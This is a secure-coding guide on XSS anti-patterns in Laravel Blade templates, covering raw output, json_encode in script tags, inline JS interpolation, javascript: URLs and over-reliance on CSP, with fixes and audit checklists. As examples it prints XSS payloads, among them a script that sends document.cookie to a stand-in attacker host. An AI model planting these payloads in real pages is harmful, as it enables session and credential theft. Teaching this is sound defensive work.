# Anti-Patterns: Blade Auto-Escaping and XSS Prevention

## Metadata

| Attribute | Value |
|-----------|-------|
| Domain | Security & Identity Engineering |
| Subdomain | Security Hardening |
| Knowledge Unit | Blade Auto-Escaping and XSS Prevention |
| Audience | Developers, Architects |

---

## Anti-Pattern Inventory

| ID | Name | Severity | Frequency | Effort to Fix |
|----|------|----------|-----------|---------------|
| AP-BX-01 | Raw Output Without Sanitization | Critical | High | Low |
| AP-BX-02 | {!! json_encode() !!} in JavaScript | High | Medium | Low |
| AP-BX-03 | Inline JavaScript String Interpolation | High | Medium | Low |
| AP-BX-04 | Unescaped User Data in HTML Attributes | High | Medium | Medium |
| AP-BX-05 | CSP as Primary XSS Defense | High | Medium | High |

---

## Repository-Wide Anti-Patterns

- **No {!! !!} Audit**: Codebase has never been grepped for raw output usage
- **No HTML Sanitizer**: Rich text stored without HTMLPurifier or DOMPurify
- **Blade XSS Tunneling**: Escaped content passed through `{!! !!}` in parent templates

---

## 1. Raw Output Without Sanitization

### Category
Security · Critical

### Description
Using `{!! $var !!}` with user-generated content that hasn't been sanitized, allowing arbitrary HTML and JavaScript injection.

### Why It Happens
Rich text editors (WYSIWYG) need to render HTML. The simplest approach is `{!! $post->body !!}`. Developers may not realize the database content came from user input and could contain malicious scripts.

### Warning Signs
- `{!!` usage without corresponding sanitization step
- Database stores raw HTML from WYSIWYG editors without purification
- No HTMLPurifier or similar sanitizer dependency
- `{!! $post->body !!}` pattern in templates
- User-generated HTML rendered with `{!! !!}`

### Why Harmful
Any user can inject `<script>`, event handlers (`onload`, `onclick`), or phishing forms. The browser executes the injected code in the context of your application, allowing cookie theft, redirection, or credential harvesting.

### Real-World Consequences
- User profile with `<script>document.location='https://evil.com?cookie='+document.cookie</script>` in bio
- Comment section exploited for mass phishing
- CSRF tokens stolen via injected JavaScript
- Stored XSS: malicious payload executes for every visitor

### Preferred Alternative
Sanitize rich text with HTMLPurifier before storage. Use `{{ }}` for all other user content.

### Refactoring Strategy
1. Grep `{!!` in the codebase
2. For each occurrence, determine if content is user-generated
3. Install HTMLPurifier: `composer require mews/purifier`
4. Sanitize on input or output
5. Replace unsanitized `{!! !!}` with `{{ }}` or sanitized output

### Detection Checklist
- [ ] Grep `{!!` in Blade templates
- [ ] Is every `{!! !!}` usage justified with sanitization?
- [ ] Is there an HTML sanitizer installed?
- [ ] Is user-generated HTML purified before rendering?
- [ ] Are there any `{!! !!}` on raw database content?

### Related Rules/Skills/Trees
- Default to `{{ }}` for All User-Content Output (05-rules.md)
- Sanitize Rich Text Before Using `{!! !!}` (05-rules.md)
- Prevent XSS in Blade Templates with Proper Escaping (06-skills.md)
- Output Escaping vs Raw Output decision tree (07-decision-trees.md)

---

## 2. {!! json_encode() !!} in JavaScript

### Category
Security · High

### Description
Using `{!! json_encode($data) !!}` inside `<script>` tags to pass PHP data to JavaScript, creating XSS vectors through `</script>` injection.

### Why It Happens
`json_encode()` produces valid JSON. Developers assume JSON output is safe. But `{!! !!}` outputs raw text, and when embedded in a `<script>` tag, a JSON string containing `</script>` closes the script tag, allowing arbitrary HTML/script injection.

### Warning Signs
- `{!! json_encode($data) !!}` inside `<script>` tags
- `{!! json_encode($data) !!}` anywhere in Blade
- `json_encode()` combined with raw output
- Manual serialization of data for JavaScript consumption

### Why Harmful
A user-generated string value in `$data` containing `</script>` breaks out of the JavaScript context and injects arbitrary HTML. Blade escaping (`{{ }}`) would escape this, but `{!! !!}` passes it through.

### Real-World Consequences
- User name containing `</script><script>alert(1)</script>` breaks JS and executes XSS
- Attacker crafts a payload in a data field that executes on every page load
- CSRF token exfiltration through injected script

### Preferred Alternative
Use `@json($data)` which properly escapes `</script>` sequences.

### Refactoring Strategy
1. Search for `{!! json_encode(` in codebase
2. Replace with `@json(...)`
3. `@json` handles escaping, uses correct encoding

### Detection Checklist
- [ ] Is `{!! json_encode() !!}` used anywhere?
- [ ] Are `@json()` calls used for JavaScript data instead?
- [ ] Does any `@json` escape `<` and `>` correctly?
- [ ] Are there manual JSON serializations in Blade?

### Related Rules/Skills/Trees
- Use `@json()` for JavaScript Data Embedding (05-rules.md)
- Prevent XSS in Blade Templates with Proper Escaping (06-skills.md)
- Contextual Encoding Strategy decision tree (07-decision-trees.md)

---

## 3. Inline JavaScript String Interpolation

### Category
Security · High

### Description
Embedding Blade variables directly in JavaScript strings without considering JavaScript context escaping.

### Why It Happens
`<script>const title = '{{ $post->title }}';</script>` looks safe — Blade escapes `'` to `&#039;`. But the browser decodes the HTML entity before JavaScript parses it, so the entity becomes a literal quote, and the JavaScript value is still correct. However, other characters like backslash (`\`) or newlines can break the JavaScript string.

### Warning Signs
- `{{ $var }}` inside `<script>` strings
- JavaScript strings closed by content with single quotes or backslashes
- User content containing `\`, `'`, or newlines breaks JavaScript
- No `@json()` or JSON encoding for JS data

### Why Harmful
While `{{ }}` escapes for HTML context, JavaScript has different escaping requirements. A backslash (`\`) in user content becomes a JavaScript escape character. A newline breaks the JavaScript string. Though the browser's HTML parser handles some of this, relying on it for JS context is fragile.

### Real-World Consequences
- User name `O'Brien` breaks the JavaScript string
- Content with newline causes `Uncaught SyntaxError: Invalid or unexpected token`
- Application JavaScript fails silently, features broken

### Preferred Alternative
Use `@json($data)` for complex data. For simple strings, ensure JavaScript-safe encoding or use data attributes.

### Refactoring Strategy
1. For JavaScript data objects, use `@json($data)`
2. For simple string values, use `<script>const x = @json($value);</script>` or pass via data attributes
3. Avoid manual string interpolation in `<script>` context

### Detection Checklist
- [ ] Are Blade variables used in `<script>` string literals?
- [ ] Can user content contain characters that break JS?
- [ ] Is `@json()` used for JavaScript data?
- [ ] Are data attributes used as an alternative?
- [ ] Have edge cases (quotes, backslashes, newlines) been tested?

### Related Rules/Skills/Trees
- Encode for the Correct Output Context (05-rules.md)
- Prevent XSS in Blade Templates with Proper Escaping (06-skills.md)
- Contextual Encoding Strategy decision tree (07-decision-trees.md)

---

## 4. Unescaped User Data in HTML Attributes

### Category
Security · High

### Description
Using user-generated content in HTML attributes without proper escaping for the attribute context.

### Why It Happens
`<a href="{{ $userProvidedUrl }}">` appears safe — Blade escapes `"` to `&quot;`. But `$userProvidedUrl = "javascript:alert(1)"` is not blocked by escaping. The quote escaping prevents attribute injection, but the protocol (`javascript:`) still executes.

### Warning Signs
- User-generated URLs in `href`, `src`, or `action` attributes
- `{{ }}` used in attributes without URL validation
- `javascript:` protocol URLs rendered from user content
- No URL scheme whitelisting before rendering

### Why Harmful
While Blade prevents breaking out of the attribute (through quote escaping), it doesn't validate the content's protocol. `javascript:` URLs execute in the context of the page, allowing full XSS. CSS expressions in `style` attributes can also execute JavaScript.

### Real-World Consequences
- User-submitted link `javascript:alert(document.cookie)` executes on click
- Profile page link field used for XSS against other users
- Stored XSS via malicious URL in database

### Preferred Alternative
Validate and whitelist URL protocols before output. Use `Str::startsWith($url, 'https://')`.

### Refactoring Strategy
1. Add URL validation before storing or rendering user URLs
2. Whitelist allowed protocols (`https://`, `mailto:`, `tel:`)
3. Strip `javascript:` and other dangerous schemes
4. For non-URL attributes, use `{{ }}` which is sufficient (escapes quotes)

### Detection Checklist
- [ ] Are user URLs rendered in `href`/`src` attributes?
- [ ] Is there protocol validation before rendering?
- [ ] Are `javascript:` URLs possible?
- [ ] Is `style` attribute set from user content?
- [ ] Are URLs validated on both input and output?

### Related Rules/Skills/Trees
- Encode for the Correct Output Context (05-rules.md)
- Prevent XSS in Blade Templates with Proper Escaping (06-skills.md)
- Contextual Encoding Strategy decision tree (07-decision-trees.md)

---

## 5. CSP as Primary XSS Defense

### Category
Security · High

### Description
Relying on Content-Security-Policy headers as the primary XSS defense instead of Blade's auto-escaping.

### Why It Happens
CSP is a powerful browser security mechanism. It can block inline scripts even if they're injected through an XSS vulnerability. Developers may feel CSP eliminates the need for strict output escaping and lax their Blade escaping practices.

### Warning Signs
- `{!! !!}` used freely with assumption "CSP will block it"
- CSP configured with `'unsafe-inline'` for convenience
- No Blade escaping discipline; unescaped output throughout templates
- Team believes CSP is sufficient XSS protection

### Why Harmful
CSP can be bypassed through script gadgets, JSONP endpoints, browser extensions, or CSP syntax errors. Even a strict CSP is only as strong as its configuration. A single misconfigured directive (e.g., `'unsafe-inline'`, `'unsafe-eval'`, or a script gadget) renders CSP ineffective. Blade escaping is the primary, reliable XSS defense.

### Real-World Consequences
- CSP bypass via script gadget discovered — full XSS because templates don't escape
- CSP downgraded from strict to permissive due to third-party scripts
- Browser extension or MITM removes CSP header — no defense left
- CSP parsing error in older browsers — no protection

### Preferred Alternative
Treat Blade escaping as the primary XSS defense. CSP is defense-in-depth, not a replacement.

### Refactoring Strategy
1. Audit all `{!! !!}` usage — minimize to only sanitized content
2. Default to `{{ }}` for all output
3. Keep CSP as secondary layer
4. Do not add `'unsafe-inline'` to CSP — fix escaping instead

### Detection Checklist
- [ ] Is CSP the only XSS defense?
- [ ] Are there `{!! !!}` with unsanitized user content?
- [ ] Does CSP use `'unsafe-inline'`?
- [ ] Would the app survive a CSP bypass?
- [ ] Are Blade escaping best practices followed?

### Related Rules/Skills/Trees
- Use CSP as Defense-in-Depth, Not Primary XSS Protection (05-rules.md)
- Prevent XSS in Blade Templates with Proper Escaping (06-skills.md)
